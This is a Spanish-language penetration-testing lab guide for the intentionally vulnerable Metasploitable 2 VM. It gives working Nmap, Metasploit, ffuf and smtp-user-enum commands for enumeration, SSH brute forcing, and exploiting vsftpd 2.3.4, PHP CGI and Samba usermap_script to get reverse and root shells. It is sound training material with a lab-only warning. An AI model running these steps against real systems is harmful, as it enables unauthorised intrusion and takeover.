# Metasploitable 2 en VMware – Guía práctica de instalación, enumeración y explotación

## Introducción

En esta práctica se trabaja con **Metasploitable 2**, una máquina virtual deliberadamente vulnerable diseñada para el aprendizaje de seguridad ofensiva y pruebas de penetración en entornos controlados. El objetivo es desplegar la máquina en **VMware**, verificar la conectividad de red y realizar un proceso completo de **enumeración, explotación y post-explotación** utilizando herramientas habituales como **Nmap** y **Metasploit Framework**.

A lo largo del laboratorio se cubren los siguientes puntos:

- Descarga e importación de Metasploitable 2 en VMware.
- Identificación de la dirección IP y verificación de conectividad desde Kali Linux.
- Enumeración completa de puertos y servicios con Nmap.
- Identificación de configuraciones inseguras (FTP anónimo).
- Explotación de una vulnerabilidad conocida en **vsftpd 2.3.4**.
- Obtención de acceso remoto mediante reverse shell.
- Ataque de fuerza bruta contra el servicio SSH usando diccionarios.
- Acceso al sistema mediante credenciales débiles.
- Escalada de privilegios mediante una mala configuración de `sudo`.

> **Aviso:** Esta guía está pensada **exclusivamente para entornos de laboratorio y aprendizaje**. Metasploitable 2 es intencionadamente insegura y no debe exponerse nunca a redes reales o no controladas.

---

## 1. Descarga de Metasploitable 2

El primer paso es obtener Metasploitable 2 desde la página oficial de Rapid7:

https://www.rapid7.com/products/metasploit/metasploitable/

En esa página, se pulsa el botón **Download** para descargar la máquina virtual.

El archivo descargado es un **.zip**, que contiene los ficheros de la máquina virtual.

---

## 2. Extracción de los archivos

Una vez descargado el archivo ZIP:

1. Se descomprime en el equipo local.
2. Tras la extracción, se obtiene una carpeta que contiene varios archivos, entre ellos:
   - `Metasploitable.vmx` (archivo de configuración de la máquina virtual)
   - `Metasploitable.vmdk` (disco virtual)

Esta carpeta será la que se utilice para importar la máquina en VMware.

---

## 3. Importar Metasploitable en VMware

1. Abrir **VMware**.
2. En el menú superior, ir a: **Archivo > Abrir**
3. Navegar hasta la carpeta donde se extrajo Metasploitable.
4. Seleccionar el archivo `Metasploitable.vmx`.
5. Pulsar en **Abrir**.

VMware cargará la configuración de la máquina virtual y la máquina quedará lista para usarse.

---

## 4. Primer arranque y acceso al sistema

Durante el arranque, Metasploitable 2 muestra un aviso indicando que la máquina **no debe exponerse a redes no confiables**.

Tras finalizar el inicio, aparece la pantalla de login.

Credenciales por defecto:

- Usuario: `msfadmin`
- Contraseña: `msfadmin`

![Pantalla de login de Metasploitable](images/01-login-screen.png)

Introduciendo estas credenciales se accede correctamente al sistema.

![Sesión iniciada correctamente](images/02-successful-login.png)

Una vez dentro, se muestra un prompt bajo el usuario `msfadmin`, confirmando que la máquina funciona correctamente.

---

## 5. Comprobación de la dirección IP y conectividad

Una vez iniciada sesión en Metasploitable 2, el siguiente paso es identificar la **dirección IP** que le ha sido asignada a la máquina virtual.

### 5.1 Obtener la IP desde Metasploitable

Dentro de Metasploitable:

```bash
ifconfig
```

En la interfaz de red `eth0` se puede ver la dirección IP asignada.  
En este caso:

```text
192.168.184.130
```

### 5.2 Comprobar conectividad desde Kali Linux

Desde Kali Linux:

```bash
ping 192.168.184.130
```

La respuesta confirma que:

- Ambas máquinas están en la misma red de laboratorio
- Existe conectividad entre Kali y Metasploitable
- El entorno está listo para comenzar

### 5.3 Descubrir la IP si no se conoce (netdiscover)

En caso de no conocer la IP, se puede descubrir con `netdiscover`:

```bash
sudo netdiscover
```

La herramienta envía peticiones ARP en la red local y muestra hosts activos, permitiendo identificar Metasploitable por IP/MAC/fabricante (VMware).

---

## 6. Enumeración de servicios con Nmap

Para obtener puertos, servicios y versiones:

```bash
nmap -p- -sCV -n -Pn -vvv -T5 192.168.184.130 -oN fullscan
```

### 6.1 Explicación del comando

- `-p-`: Escanea todos los puertos TCP (1–65535).
- `-sC`: Ejecuta scripts por defecto de Nmap (NSE default).
- `-sV`: Detección de versiones.
- `-n`: Sin resolución DNS.
- `-Pn`: Asume host activo.
- `-vvv`: Muy verboso.
- `-T5`: Timing agresivo (solo en laboratorio).
- `-oN fullscan`: Exporta a fichero.

### 6.2 Revisión y organización de resultados

```bash
cat fullscan
mkdir metasploitable
mv fullscan metasploitable/
cd metasploitable
ls
```

### 6.3 FTP (puerto 21) y FTP anónimo

Nmap reporta:

- Puerto: `21/tcp`
- Servicio: FTP
- Versión: `vsftpd 2.3.4`

Y además:

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

### 6.4 Verificación manual de FTP anónimo

```bash
ftp Anonymous@192.168.184.130
```

Cuando pida contraseña, pulsar **Enter**.

Resultado:

```text
230 Login successful.
```

---

## 7. Explotación del servicio FTP vulnerable (vsftpd 2.3.4)

### 7.1 Búsqueda con searchsploit

```bash
searchsploit vsftpd 2.3.4
```

### 7.2 Uso de Metasploit Framework

```bash
msfconsole
```

Buscar y usar:

```text
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
```

### 7.3 Configuración

Obtener IP atacante:

```bash
ifconfig
```

Ejemplo IP Kali:

```text
192.168.184.128
```

Configurar:

```text
set CHOST 192.168.184.128
set CPORT 9090
set RHOSTS 192.168.184.130
```

### 7.4 Ejecución

```text
run
```

Salida típica:

```text
[+] ... Backdoor service has been spawned ...
[+] ... UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session opened
```

### 7.5 Impacto

Ejecución remota de comandos como root (RCE crítico) → compromiso total.

---

## 8. Acceso a la víctima tras la explotación

Metasploit indica una sesión similar a:

```text
Command shell session 1 opened (192.168.184.128:9090 -> 192.168.184.130:6200)
```

Verificar en la shell:

```bash
ifconfig
```

Debe aparecer la IP de la víctima (`192.168.184.130`).

---

## 9. Fuerza bruta contra SSH con Metasploit

Nmap reporta SSH:

```text
22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1
```

### 9.1 Diccionarios

`users`:

```text
admin
admin123
msfadmin
```

`passwords`:

```text
pass
password
msfadmin
```

### 9.2 Módulo

```bash
msfconsole
```

```text
search ssh_login
use auxiliary/scanner/ssh/ssh_login
```

### 9.3 Configuración

```text
set RHOSTS 192.168.184.130
set RPORT 22
set USER_FILE users
set PASS_FILE passwords
set STOP_ON_SUCCESS true
```

### 9.4 Ejecución

```text
run
```

---

## 10. Acceso por SSH con credenciales válidas

Resultado típico:

```text
Success: 'msfadmin:msfadmin'
SSH session 1 opened (192.168.184.128 -> 192.168.184.130:22)
```

### 10.1 Sesiones

```text
sessions
sessions 1
```

Verificación:

```bash
whoami
```

```text
msfadmin
```

---

## 11. Escalada de privilegios con sudo

```bash
sudo -l
```

Salida:

```text
User msfadmin may run the following commands on this host:
    (ALL) ALL
```

### 11.1 Root

```bash
sudo su
whoami
```

```text
root
```

### 11.2 Impacto

Cualquier compromiso de `msfadmin` → root inmediato. No hay separación real de privilegios.

---

## 12. Conclusiones

Este laboratorio reproduce un flujo completo de compromiso en un entorno controlado:

- Despliegue en VMware
- Enumeración (Nmap)
- Detección de configuraciones inseguras (FTP anónimo)
- Explotación (vsftpd 2.3.4)
- Acceso remoto (reverse shell/sesiones)
- Ataque a credenciales (SSH)
- Escalada por mala configuración (`sudo`)

Refuerza la importancia de:

- Mantener servicios actualizados
- Deshabilitar accesos anónimos
- Políticas de contraseñas robustas
- Principio de mínimos privilegios en `sudo`
- Monitorización y auditoría de servicios expuestos

---

# Metasploitable 2 — Laboratorio Completo de Enumeración y Explotación (Servicios adicionales)

> En esta sección se documentan servicios adicionales identificados tras `fullscan` y su explotación/enumeración.

---

# 13️⃣ Telnet (23/tcp)

```text
23/tcp open telnet Linux telnetd
```

Después de explotar SSH, revisamos nuevamente `fullscan` y detectamos Telnet.

Telnet es un protocolo antiguo (1969) que permite acceso remoto sin cifrado. Hoy en día está obsoleto porque transmite credenciales en texto plano.

## Conexión

```bash
telnet 192.168.184.130
```

No es necesario indicar puerto (usa 23 por defecto).

📷 **Imagen — Login Telnet**  
![Telnet Login](image_telnet_login.png)

En este laboratorio el servicio está mal configurado y permite autenticación con credenciales débiles.

📷 **Imagen — Sesión Telnet iniciada**  
![Telnet Session](image_telnet_session.png)

---

# 14️⃣ SMTP (25/tcp)

```text
25/tcp open smtp Postfix smtpd
```

## Conexión con Netcat

```bash
nc 192.168.184.130 25
```

Netcat permite interactuar manualmente con servicios TCP (conexiones salientes o modo escucha, útil también para reverse shells).

📷 **Imagen — Conexión SMTP con HELO**  
![SMTP HELO](image_smtp_helo.png)

## Envío manual de correo

```text
MAIL FROM:<atacante@inventando.com>
250 2.1.0 Ok

RCPT TO:<msfadmin@metasploitable.localdomain>
250 2.1.5 Ok

DATA
354 End data with <CR><LF>.<CR><LF>

contenido del correo
.

250 2.0.0 Ok: queued as D7793CBB9
```

El mensaje queda en cola.

Para salir:

```text
QUIT
```

---

## Enumeración de usuarios con VRFY

`VRFY` permite verificar si un usuario existe localmente en el servidor SMTP (útil para enumeración de usuarios):

```text
VRFY root
252 2.0.0 root

VRFY admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table

VRFY msfadmin
252 2.0.0 msfadmin
```

- `252` → Usuario existe  
- `550` → Usuario no existe  

## Enumeración automatizada con smtp-user-enum

Permite pasar una lista de usuarios y comprobar existencia por fuerza bruta:

```bash
smtp-user-enum -M VRFY -U users -t 192.168.184.130
```

**Explicación:**

- `-M VRFY` → Método (VRFY).
- `-U users` → Fichero con usuarios a probar.
- `-t 192.168.184.130` → Objetivo (target).

Ejemplo de salida:

```text
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... users
Target count ............. 1
Username count ........... 4
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Thu Feb 12 12:42:57 2026 #########
192.168.184.130: msfadmin exists
######## Scan completed at Thu Feb 12 12:43:02 2026 #########
1 results.

4 queries in 5 seconds (0.8 queries / sec)
```

---

# 15️⃣ HTTP (80/tcp)

Accedemos a:

```text
http://192.168.184.130
```

📷 **Imagen — Página principal**  
![Web Home](image_web_home.png)

## Enumeración de rutas con ffuf

```bash
ffuf -u http://192.168.184.130/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Explicación:**

- `-u` → URL objetivo (donde `FUZZ` será sustituido).
- `FUZZ` → Punto de fuzzing para rutas.
- `-c` → Salida con colores.
- `-w` → Wordlist.

📷 **Imagen — Resultado ffuf**  
![FFUF Results](image_ffuf.png)

Ejemplos de resultados:

```text
test                    [Status: 301, Size: 322, Words: 21, Lines: 10]
twiki                   [Status: 301, Size: 323, Words: 21, Lines: 10]
tikiwiki                [Status: 301, Size: 326, Words: 21, Lines: 10]
phpinfo                 [Status: 200, Size: 48074, Words: 2409, Lines: 657]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 11]
phpMyAdmin              [Status: 301, Size: 328, Words: 21, Lines: 10]
```

📷 **Imagen — Directorio /test**  
![Test Directory](image_test.png)

## phpinfo como vulnerabilidad

`/phpinfo` es una fuga de información porque expone detalles sensibles del servidor y PHP.

📷 **Imagen — phpinfo**  
![PHP Info](image_phpinfo.png)

En `Server API` aparece **FastCGI**, lo que puede abrir la puerta a técnicas específicas (dependiendo de configuración/versión).

---

## Explotación: PHP CGI Argument Injection (Metasploit)

En Metasploit:

```bash
msfconsole
search PHP CGI
```

De los módulos encontrados, seleccionamos el genérico:

```text
exploit/multi/http/php_cgi_arg_injection
```

Uso:

```text
use exploit/multi/http/php_cgi_arg_injection
show options
set RHOSTS 192.168.184.130
run
```

📷 **Imagen — Meterpreter shell**  
![Meterpreter](image_meterpreter.png)

Tras abrir sesión, lanzamos una shell:

```text
shell
whoami
www-data
```

**¿Por qué `www-data`?**  
Porque el código se ejecuta a través del servidor web. En Linux, Apache suele ejecutarse bajo el usuario de servicio `www-data`.

Enumeración rápida:

```text
pwd
/var/www

ls
dav
dvwa
index.php
mutillidae
phpMyAdmin
phpinfo.php
test
tikiwiki
tikiwiki-old
twiki
```

### Nota sobre Meterpreter

Meterpreter es un pseudo-terminal de Metasploit:

- Tiene comandos propios, pero no siempre es una shell nativa completa.
- “Hace más ruido” (más detectable) que una shell tradicional.
- En un entorno real podría ser bloqueado por AV/EDR.
- `shell` permite pasar a una shell más “real” e interactiva.

---

# 16️⃣ SMB / Samba (139/tcp y 445/tcp)

Nmap reporta:

```text
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

**Samba/SMB** permite compartir ficheros/recursos en red. Es muy común en entornos Windows/Active Directory, pero también se usa en Linux.

## Enumeración con smbclient

```bash
smbclient -L //192.168.184.130/ -N
```

**Explicación de opciones:**

- `-L` → Lista los recursos compartidos (shares).
- `//192.168.184.130/` → Servidor objetivo.
- `-N` → No solicita contraseña (login anónimo).

Salida ejemplo:

```text
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
```

Permite enumeración anónima → mala configuración (exposición de información).

---

## Identificación de versión vulnerable y explotación

El escaneo aportó la versión:

- `Samba smbd 3.0.20-Debian`

Buscamos en Metasploit:

```bash
msfconsole
search samba 3.0.20
```

Módulo encontrado:

```text
exploit/multi/samba/usermap_script
```

Esta vulnerabilidad permite **ejecución remota de comandos** (RCE).

### Explotación

```text
use exploit/multi/samba/usermap_script
show options
set RHOSTS 192.168.184.130
run
```

Salida típica:

```text
[*] Started reverse TCP handler on 192.168.184.128:4444
[*] Command shell session 1 opened ...
```

Dentro de la shell:

```text
whoami
root
```

Compromiso total del sistema.

> Nota: esto demuestra lo importante que es `-sV` en Nmap: con la versión exacta, la búsqueda de exploits es inmediata.

---

# ✅ Conclusión final

El laboratorio muestra cómo una combinación de servicios:

- vulnerables,
- obsoletos,
- mal configurados,
- y con credenciales débiles,

puede llevar al **compromiso total** de un sistema, incluso sin técnicas avanzadas.

Servicios documentados:

- FTP (vsftpd 2.3.4)
- SSH (credenciales débiles / fuerza bruta)
- Sudo (mala configuración)
- Telnet (obsoleto y sin cifrado)
- SMTP (enumeración de usuarios y envío manual)
- HTTP (enumeración de rutas + phpinfo + RCE por CGI)
- SMB/Samba (enumeración anónima + RCE)

